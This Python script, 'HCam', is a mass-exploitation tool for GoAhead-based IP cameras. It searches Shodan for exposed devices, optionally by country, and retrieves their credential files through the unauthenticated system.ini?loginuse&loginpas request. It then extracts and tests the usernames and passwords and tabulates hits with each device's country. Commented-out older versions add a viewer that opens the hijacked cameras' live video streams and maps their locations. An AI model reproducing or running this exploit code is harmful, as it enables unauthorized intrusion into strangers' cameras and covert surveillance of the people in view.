import os
import json
import shodan
import argparse
import configparser
import urllib.request
from geocoder import ip
from requests import get
from requests import session
from prettytable import PrettyTable
from colorama import init, Fore, Back
from progress.bar import IncrementalBar
from requests.auth import HTTPDigestAuth
import requests

parser = argparse.ArgumentParser(description='HCam help')
parser.add_argument("--api", help = 'Change API.', default = None)
parser.add_argument("--ip", help = 'Check the specified IP.', default = None)
parser.add_argument("--country", help = 'Search for vulnerable devices in the country you specify (Alpha-2 FORMAT).', default = None)
args = parser.parse_args()

init(autoreset=True)

start = '''
██╗░░██╗░█████╗░░█████╗░███╗░░░███╗
██║░░██║██╔══██╗██╔══██╗████╗░████║
███████║██║░░╚═╝███████║██╔████╔██║
██╔══██║██║░░██╗██╔══██║██║╚██╔╝██║
██║░░██║╚█████╔╝██║░░██║██║░╚═╝░██║
╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝'''

if os.path.exists('api_key.config') == False:
  os.system('cls')
  rows = os.get_terminal_size()
  columns = rows.columns
  lines = start.split('\n')
  for line in lines:
    spaces = ' ' * ((columns - len(line)) // 2)
    print(spaces + line)
  while True:
    try:
     api = input('Enter a valid API Key: ')
     if api == '':
      pass
     else:
      key = shodan.Shodan(api)
      key.search('realm="GoAhead", domain=":81"')
      with open('api_key.config', 'w') as e:
       e.write('[API]')
      conf = configparser.RawConfigParser()
      conf.read("api_key.config", encoding='utf-8')
      conf.set("API", "API", api)
      conf.write(open("api_key.config", "w", encoding='utf-8'))
      #os.system('cls || clear')
      break
    except KeyboardInterrupt:
      print(Fore.LIGHTRED_EX + "\nProgram stopped.")
      exit()
    except:
      print(Fore.LIGHTRED_EX + "Wrong API key! Try again.\n")
      #os.system('cls')
else:
  conf = configparser.RawConfigParser()    
  conf.read("api_key.config", encoding='utf-8')

key = conf.get("API", "api")

def custom(ip):
 if os.path.exists('api_key.config') == False:
  while True:
    try:
     api = input('Enter a valid API Key: ')
     if api == '':
      pass
     else:
      key = shodan.Shodan(api)
      key.search('realm="GoAhead", domain=":81"')
      with open('api_key.config', 'w') as e:
       e.write('[API]')
      conf = configparser.RawConfigParser()
      conf.read("api_key.config", encoding='utf-8')
      conf.set("API", "API", api)
      conf.write(open("api_key.config", "w", encoding='utf-8'))
      #os.system('cls || clear')
      break
    except KeyboardInterrupt:
      print("\nProgram stopped.")
      exit()
    except:
      print("Wrong API key! Try again.\n")
 else:
  conf = configparser.RawConfigParser()    
  conf.read("api_key.config", encoding='utf-8')

 key = conf.get("API", "api")

 api = shodan.Shodan(key)

 num_of_vulnerable = []
 ips = [ip]

 def st():

  for ip in list(set(ips)):
   try:

    print(f"\nTesting {Fore.CYAN + ip}")
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

    with open(f'camera_{ip}.ini', 'wb') as f:
     f.write(r.content)

    if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
     os.remove(f'camera_{ip}.ini')
     print(Fore.LIGHTRED_EX + 'Denied')
     exit()
    else:
     num_of_vulnerable.append(ip)
     print(Fore.LIGHTGREEN_EX + 'Accessed\n')
   except KeyboardInterrupt:
    print('\nProgram stopped.')
    exit()
   except Exception as _:
    print(f'{ip} not available.')
    exit()
 st()

 tf = ['IP', 'USERNAME', 'PASSWORD', 'zalupa']
 tg = []

 if len(num_of_vulnerable) >= int('1'):
  s = session()

  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
   raxu = 0
   for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

     try:
      data = file.read().replace('\x00', ' ')
      words = data.split()
     except KeyboardInterrupt:
      print('\nProgram stopped.')
      exit()
     except:
      print('\nSomething went wrong.')
      exit()

     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
       if page.status_code == 200:
        tg.append(ipi)
        tg.append(words[i])
        tg.append(words[i+1])
        #ad1 = ip(ipi)
        tg.append('ad1.country')
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print('\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()

       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
       if request.status_code == 200:
        tg.append(ipi)
        tg.append(words[i])
        tg.append('')
        #ad1 = ip(ipi)
        tg.append('ad1.country')
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print('\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
      except KeyboardInterrupt:
        print('\nProgram stopped.')
        exit()
      except Exception as e:
        print(e)
        continue
    except KeyboardInterrupt:
     print('\nProgram stopped.')
     exit()
    except Exception as e:
     print(e)
     continue

 columns = len(tf)

 table1 = PrettyTable(tf)

 tg_data = tg[:]
 while tg_data:
    table1.add_row(tg_data[:columns])
    tg = tg_data[columns:]
 print(f'\n{table1}\n')
 exit()


def country(country):
 reasons = '''
 [*] API key is not premium.
 [*] Wrong API key.
 [*] Wrong country code (Alpha-2 required)
 [*] No internet connection'''
 try:
  test = shodan.Shodan(key)
  test.search(f'realm="GoAhead", domain=":81", country:{country}')
  global request
  request = f'realm="GoAhead", domain=":81", country:{country}'
  os.system('clear || cls')
 except shodan.exception.APIError as e:
  print(Fore.LIGHTRED_EX + f'\nError: {e}')
  exit()
 except:
  print(f'An unexpected error has occurred! Possible reasons:\n{reasons}')
  exit()

if args.country == None:
    request = 'realm="GoAhead", domain=":81"'
    pass
else:
  country(args.country)

if args.ip == None:
    pass
else:
  custom(args.ip)

if args.api == None:
    pass
else:
    try:
        key = shodan.Shodan(args.api)
        key.search('realm="GoAhead", domain=":81"')
        try:
         conf = configparser.RawConfigParser()
         conf.read("api_key.config", encoding='utf-8')
         conf.set("API", "api", args.api)
         conf.write(open("api_key.config", "w", encoding='utf-8'))
         print('Key updated successfully!')
         exit()
        except Exception as i:
         print(i)
         pass
    except KeyboardInterrupt:
        print("\nProgram stopped.")
        exit()
    except Exception as _:
        print("Wrong API key! Try again.")
        exit()

#os.system('clear || cls')

try:
 mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
except urllib.error.URLError:
 print("Check your internet connection!")
 exit()
except KeyboardInterrupt:
 print("\nProgram stopped.")
 exit()
except:
 print("Something went wrong!")
 exit()

# init(autoreset=True)

# if os.path.exists('api_key.config') == False:
#   while True:
#     try:
#      api = input('Enter valid API key: ')
#      if api == '':
#       pass
#      else:
#       key = shodan.Shodan(api)
#       key.search('realm="GoAhead", domain=":81"')
#       with open('api_key.config', 'w') as e:
#        e.write('[API]')
#       conf = configparser.RawConfigParser()
#       conf.read("api_key.config", encoding='utf-8')
#       conf.set("API", "API", api)
#       conf.write(open("api_key.config", "w", encoding='utf-8'))
#       #os.system('cls || clear')
#       break
#     except KeyboardInterrupt:
#       print("\nProgram stopped.")
#       exit()
#     except:
#       print("Wrong API key! Try again.\n")
# else:
#   conf = configparser.RawConfigParser()    
#   conf.read("api_key.config", encoding='utf-8')

# key = conf.get("API", "api")

api = shodan.Shodan(key)

num_of_vulnerable = []
ips = []

def st():

 try:
  results = api.search(request)
 except shodan.exception.APIError:
  os.remove('api_key.config')
  print('Wrong API key!\nRestart the program and enter the correct API.')
  exit()
 except KeyboardInterrupt:
  print("\nProgram stopped.")
  exit()

 for result in results['matches']:
  ips.append(format(result['ip_str']))

 for ip in list(set(ips)):
  try:

   print(f"Testing {Fore.CYAN + ip}")
   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

   with open(f'camera_{ip}.ini', 'wb') as f:
    f.write(r.content)

   if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
    os.remove(f'camera_{ip}.ini')
    print(Fore.LIGHTRED_EX + 'Denied\n')
   else:
    num_of_vulnerable.append(ip)
    print(Fore.LIGHTGREEN_EX + 'Accessed\n')
  except KeyboardInterrupt:
    print("\n")
    break
    #exit()
  except:
    print(f'{ip} not available.\n')
    continue
st()

if len(num_of_vulnerable) >= int('1'):
  taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
else:
  taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))

th = ['IP', 'PORT', 'USERNAME', 'PASSWORD', 'LAND']
td = []

if len(num_of_vulnerable) >= int('1'):
 s = session()

 with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
  raxu = 0
  for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

     try:
      data = file.read().replace('\x00', ' ')
      words = data.split()
     except KeyboardInterrupt:
      print('\nProgram stopped.')
      exit()
     except:
      print('\nSomething went wrong.')
      exit()

     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
       if page.status_code == 200:
        td.append(ipi)
        td.append('81')
        td.append(words[i])
        td.append(words[i+1])
        ad = ip(ipi)
        td.append(ad.country)
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print('\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
        break

       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
       if request.status_code == 200:
        td.append(ipi)
        td.append('81')
        td.append(words[i])
        td.append('')
        ad = ip(ipi)
        td.append(ad.country)
        file.close()
        try:
          os.remove(f'camera_{ipi}.ini')
        except KeyboardInterrupt:
          print('\nProgram stopped.')
          exit()
        except:
          pass
        bar.next()
        break
      except KeyboardInterrupt:
        print('\nProgram stopped.')
        exit()
      except:
        continue
    except KeyboardInterrupt:
     print('\nProgram stopped.')
     exit()
    except:
     continue

if len(num_of_vulnerable) >= int('1'):
 columns = len(th)

 table = PrettyTable(th)

 td_data = td[:]
 while td_data:
    table.add_row(td_data[:columns])
    td_data = td_data[columns:]
 print(f'\n{table}\n')
else:
 taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 print('Checked devices:', Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
 print('Vulnerable devices:', taro, '\n')
 print('Vulnerable devices not found! Please try again later.')








# import shodan, os, urllib.request, requests, argparse, configparser, json
# from requests import get
# from requests import session
# from colorama import init, Fore, Back
# from progress.bar import IncrementalBar
# from prettytable import PrettyTable
# from requests.auth import HTTPDigestAuth
# from geocoder import ip

# parser = argparse.ArgumentParser()
# parser.add_argument("--api", default=None)
# parser.add_argument("--ip", default=None)
# args = parser.parse_args()

# def custom(ip):
#  init(autoreset=True)
#  if os.path.exists('api_key.config') == False:
#   while True:
#     try:
#      api = input('Enter valid API key: ')
#      if api == '':
#       pass
#      else:
#       key = shodan.Shodan(api)
#       key.search('realm="GoAhead", domain=":81"')
#       with open('api_key.config', 'w') as e:
#        e.write('[API]')
#       conf = configparser.RawConfigParser()
#       conf.read("api_key.config", encoding='utf-8')
#       conf.set("API", "API", api)
#       conf.write(open("api_key.config", "w", encoding='utf-8'))
#       #os.system('cls || clear')
#       break
#     except KeyboardInterrupt:
#       print("\nProgram stopped.")
#       exit()
#     except:
#       print("Wrong API key! Try again.\n")
#  else:
#   conf = configparser.RawConfigParser()    
#   conf.read("api_key.config", encoding='utf-8')

#  key = conf.get("API", "api")

#  api = shodan.Shodan(key)

#  num_of_vulnerable = []
#  ips = [ip]

#  def st():

#   for ip in list(set(ips)):
#    try:

#     print(f"\nTesting {Fore.CYAN + ip}")
#     r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

#     with open(f'camera_{ip}.ini', 'wb') as f:
#      f.write(r.content)

#     if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
#      os.remove(f'camera_{ip}.ini')
#      print(Fore.LIGHTRED_EX + 'Denied')
#      exit()
#     else:
#      num_of_vulnerable.append(ip)
#      print(Fore.LIGHTGREEN_EX + 'Accessed\n')
#    except KeyboardInterrupt:
#     print('\nProgram stopped.')
#     exit()
#    except Exception as _:
#     print(f'{ip} not available.')
#     exit()
#  st()

#  tf = ['IP', 'USERNAME', 'PASSWORD', 'zalupa']
#  tg = []

#  if len(num_of_vulnerable) >= int('1'):
#   s = session()

#   with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
#    raxu = 0
#    for ipi in num_of_vulnerable:
#     try:
#      user = None
#      password = None
#      file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

#      try:
#       data = file.read().replace('\x00', ' ')
#       words = data.split()
#      except KeyboardInterrupt:
#       print('\nProgram stopped.')
#       exit()
#      except:
#       print('\nSomething went wrong.')
#       exit()

#      for i in range(len(words)-1):
#       try:
#        page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
#        if page.status_code == 200:
#         tg.append(ipi)
#         tg.append(words[i])
#         tg.append(words[i+1])
#         #ad1 = ip(ipi)
#         tg.append('ad1.country')
#         file.close()
#         try:
#           os.remove(f'camera_{ipi}.ini')
#         except KeyboardInterrupt:
#           print('\nProgram stopped.')
#           exit()
#         except:
#           pass
#         bar.next()

#        request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
#        if request.status_code == 200:
#         tg.append(ipi)
#         tg.append(words[i])
#         tg.append('')
#         #ad1 = ip(ipi)
#         tg.append('ad1.country')
#         file.close()
#         try:
#           os.remove(f'camera_{ipi}.ini')
#         except KeyboardInterrupt:
#           print('\nProgram stopped.')
#           exit()
#         except:
#           pass
#         bar.next()
#       except KeyboardInterrupt:
#         print('\nProgram stopped.')
#         exit()
#       except Exception as e:
#         print(e)
#         continue
#     except KeyboardInterrupt:
#      print('\nProgram stopped.')
#      exit()
#     except Exception as e:
#      print(e)
#      continue

#  columns = len(tf)

#  table1 = PrettyTable(tf)

#  tg_data = tg[:]
#  while tg_data:
#     table1.add_row(tg_data[:columns])
#     tg = tg_data[columns:]
#  print(f'\n{table1}\n')
 
#  exit()
#  input('all')


# if args.ip == None:
#     pass
# else:
#   custom(args.ip)

# if args.api == None:
#     pass
# else:
#     try:
#         key = shodan.Shodan(args.api)
#         key.search('realm="GoAhead", domain=":81"')
#         #with open('api_key.config', 'w') as e:
#         # e.write(args.api)
#         try:
#          conf = configparser.RawConfigParser()
#          conf.read("api_key.config", encoding='utf-8')
#          conf.set("API", "api", args.api)
#          conf.write(open("api_key.config", "w", encoding='utf-8'))
#          print('Key updated successfully!\n')
#          exit()
#         except Exception as i:
#          print(i)
#          pass
#     except KeyboardInterrupt:
#         print("\nProgram stopped.")
#         exit()
#     except Exception as _:
#         print("Wrong API key! Try again.\n")
#         exit()

# # input("End")
# # exit()

# os.system('clear || cls')

# try:
#  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
# except urllib.error.URLError:
#  input("Check your internet connection!")
#  exit()
# except KeyboardInterrupt:
#  print("\nProgram stopped.")
#  exit()
# except:
#  input("Something went wrong!")
#  exit()

# init(autoreset=True)

# if os.path.exists('api_key.config') == False:
#   while True:
#     try:
#      api = input('Enter valid API key: ')
#      if api == '':
#       pass
#      else:
#       key = shodan.Shodan(api)
#       key.search('realm="GoAhead", domain=":81"')
#       with open('api_key.config', 'w') as e:
#        e.write('[API]')
#       conf = configparser.RawConfigParser()
#       conf.read("api_key.config", encoding='utf-8')
#       conf.set("API", "API", api)
#       conf.write(open("api_key.config", "w", encoding='utf-8'))
#       os.system('cls || clear')
#       break
#     except KeyboardInterrupt:
#       print("\nProgram stopped.")
#       exit()
#     except:
#       print("Wrong API key! Try again.\n")
# else:
#   conf = configparser.RawConfigParser()    
#   conf.read("api_key.config", encoding='utf-8')

#   # while True:
#   #   api = input('Enter valid API key: ')
#   #   try:
#   #    if api == '':
#   #     pass
#   #    else:
#   #     key = shodan.Shodan(api)
#   #     key.search('realm="GoAhead", domain=":81"')
#   #     with open('api_key.config', 'w') as e:
#   #      e.write(api)
#   #     os.system('cls || clear')
#   #     break
#   #   except:
#   #     print("Wrong API key! Try again.\n")

# key = conf.get("API", "api") #open('api_key.config', 'r').read()

# api = shodan.Shodan(key)

# num_of_vulnerable = []
# ips = []

# def st():

#  try:
#   results = api.search('realm="GoAhead", domain=":81"')
#  except shodan.exception.APIError:
#   os.remove('api_key.config')
#   input('Wrong API key!\nRestart the program and enter the correct API.')
#   exit()
#  except KeyboardInterrupt:
#   print("\nProgram stopped.")
#   exit()

#  for result in results['matches']:
#   ips.append(format(result['ip_str']))

#  for ip in list(set(ips)):
#   try:

#    print(f"Testing {Fore.CYAN + ip}")
#    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

#    with open(f'camera_{ip}.ini', 'wb') as f:
#     f.write(r.content)

#    if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
#     os.remove(f'camera_{ip}.ini')
#     print(Fore.LIGHTRED_EX + 'Denied\n')
#    else:
#     num_of_vulnerable.append(ip)
#     print(Fore.LIGHTGREEN_EX + 'Accessed\n')
#   except KeyboardInterrupt:
#     print("\n")
#     break
#     #exit()
#   except:
#     print(f'{ip} not available.\n')
#     continue
# st()

# if len(num_of_vulnerable) >= int('1'):
#   taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
# else:
#   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))

# th = ['IP', 'USERNAME', 'PASSWORD', 'COUNTRY']
# td = []

# if len(num_of_vulnerable) >= int('1'):
#  s = session()

#  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
#   raxu = 0
#   for ipi in num_of_vulnerable:
#     try:
#      user = None
#      password = None
#      file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

#      try:
#       data = file.read().replace('\x00', ' ')
#       words = data.split()
#      except KeyboardInterrupt:
#       print('\nProgram stopped.')
#       exit()
#      except:
#       print('\nSomething went wrong.')
#       exit()

#      for i in range(len(words)-1):
#       try:
#        page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
#        if page.status_code == 200:
#         td.append(ipi)
#         td.append(words[i])
#         td.append(words[i+1])
#         ad = ip(ipi)
#         td.append(ad.country)
#         file.close()
#         try:
#           os.remove(f'camera_{ipi}.ini')
#         except KeyboardInterrupt:
#           print('\nProgram stopped.')
#           exit()
#         except:
#           pass
#         bar.next()
#         break

#        request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
#        if request.status_code == 200:
#         td.append(ipi)
#         td.append(words[i])
#         td.append('')
#         ad = ip(ipi)
#         td.append(ad.country)
#         file.close()
#         try:
#           os.remove(f'camera_{ipi}.ini')
#         except KeyboardInterrupt:
#           print('\nProgram stopped.')
#           exit()
#         except:
#           pass
#         bar.next()
#         break
#       except KeyboardInterrupt:
#         print('\nProgram stopped.')
#         exit()
#       except:
#         continue
#     except KeyboardInterrupt:
#      print('\nProgram stopped.')
#      exit()
#     except:
#      continue

# if len(num_of_vulnerable) >= int('1'):
#  columns = len(th)

#  table = PrettyTable(th)

#  td_data = td[:]
#  while td_data:
#     table.add_row(td_data[:columns])
#     td_data = td_data[columns:]
#  print(f'\n{table}\n')
# else:
#  taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
#  print('Checked devices:', Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
#  print('Vulnerable devices:', taro, '\n')
#  print('Vulnerable devices not found! Please try again later.')

# input()


















# import shodan, os, urllib.request, webbrowser, pyperclip, cv2, os.path, configparser
# from requests import get
# from requests import session
# from colorama import init, Fore

# from tkinter import ttk
# from tkinter import *
# from progress.bar import IncrementalBar
# from geocoder import ip
# from requests.auth import HTTPDigestAuth
# from tkinter.constants import *


# if os.path.exists(r'C:\Windows\Temp\cameras') == False:
#   os.mkdir(r'C:\Windows\Temp\cameras')
# elif os.path.exists(r'C:\Windows\Temp\cameras') == True:
#   pass

# if os.path.exists(r'C:\Windows\Temp\cameras\config.configure') == False:
#   while True:
#     api = input('Enter valid API key: ')
#     try:
#      if api == '':
#       pass
#      else:
#       key = shodan.Shodan(api)
#       key.search('realm="GoAhead", domain=":81"')
#       with open(r'C:\Windows\Temp\cameras\config.configure', 'w') as e:
#        e.write('[API]')
#       conf = configparser.RawConfigParser()
#       conf.read(r"C:\Windows\Temp\cameras\config.configure", encoding='utf-8')
#       conf.set("API", "API", api)
#       conf.write(open(r"C:\Windows\Temp\cameras\config.configure", "w", encoding='utf-8'))
#       os.system('cls || clear')
#       break
#     except:
#       print("Wrong API key! Try again.\n")

# conf = configparser.RawConfigParser()
# conf.read(r"C:\Windows\Temp\cameras\config.configure", encoding='utf-8')

# check_connection = 'Check your internet connection!'
# something_went_wrong = 'Something went wrong!'
# wrong_api_key = 'Wrong API key!\nRestart the program and enter the correct API.'
# trying = 'Testing'
# denied = 'Denied'
# accessed ='Accessed'
# not_aviable = 'not available.'
# devices_checked = 'Devices tested: '
# vulnerable_found = 'Vulnerable found: '
# do_you_want_to_create_a_report = 'Do you want to create a report? [Y or N]: '
# #ip = 'IP'
# username ='Username'
# password = 'Password'
# location = 'Location'
# processing = 'Processing'
# open_in_window_text = 'Open in window'
# open_in_browser_text = 'Open in browser'
# copy_ip_text = 'Copy IP'
# copy_username_text = 'Copy username'
# copy_password_text = 'Copy password'
# copy_username_and_password_text = 'Copy username & password'
# open_on_maps_text = 'Open on maps'

# try:
#  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
# except urllib.error.URLError:
#  input(check_connection)
#  exit()
# except:
#  input(something_went_wrong)
#  exit()

# init(autoreset=True)

# api = shodan.Shodan(conf.get("API", "api"))

# num_of_vulnerable = []
# ips = ['59.15.25.137']

# # try:
# #   results = api.search('realm="GoAhead", domain=":81"')
# # except shodan.exception.APIError as e:
# #   os.remove(r'C:\Windows\Temp\cameras\config.configure')
# #   input(wrong_api_key)
# #   exit()

# # for result in results['matches']:
# #   ips.append(format(result['ip_str']))

# for ip in list(set(ips)):
#   try:

#    print(f"{trying} {Fore.CYAN + ip}")
#    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10) 

#    with open(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini', 'wb') as f:
#     f.write(r.content)

#    with open(f'F:\\camera files\\camera_{ip}.ini', 'wb') as f:
#     f.write(r.content)

#    if os.stat(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini').st_size >= int('10000') or os.stat(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini').st_size == int('178') or os.stat(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini').st_size == int('171') or os.stat(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini').st_size == int('542') or os.stat(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini').st_size == int('188'):
#     os.remove(f'C:\\Windows\\Temp\\cameras\\camera_{ip}.ini')
#     os.remove(f'F:\\camera files\\camera_{ip}.ini')
#     print(Fore.LIGHTRED_EX + denied, '\n')
#    else:
#     num_of_vulnerable.append(ip)
#     print(Fore.LIGHTGREEN_EX + accessed, '\n')
#   except Exception as e:
#     print(f'{ip} {not_aviable}\n')
#     continue
# #input('alllllllllllllllllllllllllllllllllllllllllllllllllllllll')
# if len(num_of_vulnerable) >= int('1'):
#  taro = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))

#  print(devices_checked, Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
#  print(vulnerable_found, taro, '\n')

#  s = session()

#  root_enctrypt_files = Tk()
#  root_enctrypt_files.title('Treeview demo')
#  root_enctrypt_files.geometry(f"{585}x{200}+{(root_enctrypt_files.winfo_screenwidth()-480)//2}+{(root_enctrypt_files.winfo_screenheight()-200)//2}")

#  canvas_look_files = Canvas(root_enctrypt_files, height=200, width=585, bg='#3f3f42', highlightthickness=0)
#  canvas_look_files.place(relx=0, rely=0)

#  columns = ('ip', 'username', 'password', 'location')

#  tree = ttk.Treeview(root_enctrypt_files, columns=columns, show='headings')

#  tree.heading('ip', text='IP', anchor='w')
#  tree.heading('username', text=username, anchor='w')
#  tree.heading('password', text=password, anchor='w')
#  tree.heading('location', text=location, anchor='w')

#  tree.column('ip', stretch=YES, width=120)
#  tree.column('username', stretch=YES, width=150)
#  tree.column('password', stretch=YES, width=140)
#  tree.column('location', stretch=YES, width=140)


#  with IncrementalBar(processing, max=len(num_of_vulnerable)) as bar:
#   for ipi in num_of_vulnerable:
#    try:
#     user = None
#     password = None
#     file = open(f'C:\\Windows\\Temp\\cameras\\camera_{ipi}.ini', 'r', encoding='latin-1')

#     try:
#      data = file.read().replace('\x00', ' ')
#      words = data.split()
#     except Exception as r:
#      print(r)
#      input('line 188')
#     for i in range(len(words)-1):
#      ad = ip(ipi)
#      try:
#       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
#       if page.status_code == 200:
#        tree.insert('', END, values=(ipi, words[i], words[i+1], ad.address))
#        file.close()
#        os.remove(f'C:\\Windows\\Temp\\cameras\\camera_{ipi}.ini')
#        bar.next()
#        break
#       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
#       if request.status_code == 200:
#         tree.insert('', END, values=(ipi, words[i], '', ad.address))
#         file.close()
#         os.remove(f'C:\\Windows\\Temp\\cameras\\camera_{ipi}.ini')
#         bar.next()
#         break
#      except Exception as e:
#       print('e:::::::::::::', e)
#       continue
#    except Exception as w:
#     print('w:::::::::::::', w)
#     continue

#  tree.grid(row=0, column=0, sticky='nsew')

#  def open_in_window():
#   try:
#    ip = tree.item(tree.focus())['values'][0]
#    username = tree.item(tree.focus())['values'][1]
#    password = tree.item(tree.focus())['values'][2]

#    def photo_image(img):
#     h, w = img.shape[:2]
#     data = f'P6 {w} {h} 255 '.encode() + img[..., ::-1].tobytes()
#     canvas.config(width=w, height=h)
#     return PhotoImage(width=w, height=h, data=data, format='PPM')

#    def update():
#     ret, img = cap.read()
#     if ret:
#         photo = photo_image(img)
#         canvas.create_image(0, 0, image=photo, anchor=NW)
#         canvas.image = photo
#     root.after(15, update)

#    root = Toplevel()
#    root.attributes('-toolwindow', True)
#    cap = cv2.VideoCapture(f"http://{ip}:81/videostream.cgi?loginuse={username}&loginpas={password}")
#    cap1 = cv2.VideoCapture(f'http://{ip}:81/videostream.cgi?user={username}&pwd={password}')
#    cap2 = cv2.VideoCapture(f'http://{username}:{password}@{ip}:81/videostream.cgi')

#    canvas = Canvas(root, width=1200, height=700, highlightthickness=0)
#    canvas.pack()
#    update()
#    root.mainloop()
#    cap.release()
#   except:
#    pass

#  def open_browser():
#   try:
#    webbrowser.open('http://' + tree.item(tree.focus())['values'][0] + ':81')
#   except:
#    pass

#  def copy_ip():
#   try:
#    pyperclip.copy(tree.item(tree.focus())['values'][0])
#   except:
#    pass

#  def copy_user():
#   try:
#    pyperclip.copy(tree.item(tree.focus())['values'][1])
#   except:
#    pass

#  def copy_password():
#   try:
#    pyperclip.copy(tree.item(tree.focus())['values'][2])
#   except:
#    pass

#  def copy_username_and_password():
#   try:
#    pyperclip.copy(tree.item(tree.focus())['values'][1] + ' ' + tree.item(tree.focus())['values'][2])
#   except:
#    pass

#  def location():
#   try:
#    webbrowser.open(f'https://www.google.com/maps/place/'+tree.item(tree.focus())['values'][3])
#   except:
#    pass

#  menu = Menu(root_enctrypt_files, tearoff=0)
#  menu.add_command(label=open_in_window_text, command=open_in_window)
#  menu.add_command(label=open_in_browser_text, command=open_browser)
#  menu.add_command(label=copy_ip_text, command=copy_ip)
#  menu.add_command(label=copy_username_text, command=copy_user)
#  menu.add_command(label=copy_password_text, command=copy_password)
#  menu.add_command(label=copy_username_and_password_text, command=copy_username_and_password)
#  menu.add_command(label=open_on_maps_text, command=location)
#  root_enctrypt_files.bind("<Button-3>", lambda event: menu.post(event.x_root, event.y_root))

#  def focIn(event):
#   btn_exit.config(background='#e70300')

#  def focOut(event):
#   btn_exit.config(background='#3f3f42')

#  btn_exit = Button(root_enctrypt_files, text='╳', fg='white', background='#3f3f42', command=lambda: root_enctrypt_files.destroy(), activebackground='#e70300', overrelief=SUNKEN) 
#  btn_exit["border"] = "0"
#  btn_exit.bind('<Enter>',focIn)
#  btn_exit.bind('<Leave>',focOut)
#  btn_exit.place(relx = .946, rely = .0, relwidth=.055, relheight=.15)

#  def on_mouse_down(event):
#   global dif_x, dif_y
#   win_position = [int(coord) for coord in root_enctrypt_files.wm_geometry().split('+')[1:]]
#   dif_x, dif_y = win_position[0] - event.x_root, win_position[1] - event.y_root

#  def update_position(event):
#   root_enctrypt_files.wm_geometry("+%d+%d" % (event.x_root + dif_x, event.y_root + dif_y))

#  canvas_look_files.bind('<ButtonPress-1>', on_mouse_down)
#  canvas_look_files.bind('<B1-Motion>', update_position)

#  root_enctrypt_files.overrideredirect(1)
